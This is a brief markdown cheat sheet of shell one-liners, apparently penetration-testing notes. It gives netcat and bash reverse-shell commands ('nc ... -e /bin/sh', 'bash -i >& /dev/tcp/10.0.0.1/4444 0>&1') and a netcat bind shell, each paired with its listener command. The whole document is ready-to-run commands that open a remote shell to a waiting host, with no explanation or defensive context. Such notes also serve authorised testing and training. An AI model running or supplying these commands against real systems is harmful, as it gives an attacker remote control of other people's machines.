# Shells

## Reverse shell

| tool           | local                 |      | remote                         |
|----------------|-----------------------|------|--------------------------------|
| netcat         | nc -lvp 4444          |  <-  | nc 192.168.1.1 4444 -e /bin/sh |
| netcat <br> sh | nc -lvp 4444          |  <-  | bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 |

## Bind shell

| tool   | local                 |      | remote                         |
|--------|-----------------------|------|--------------------------------|
| netcat | nc 192.168.1.2 4444   |  ->  | nc -lvp 4444 -e /bin/sh        |
